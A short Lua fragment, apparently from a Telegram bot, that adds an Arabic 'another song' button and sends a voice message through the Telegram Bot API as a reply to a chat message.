+{{text = 'اغنيه اخري',callback_data="/VOISME1"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
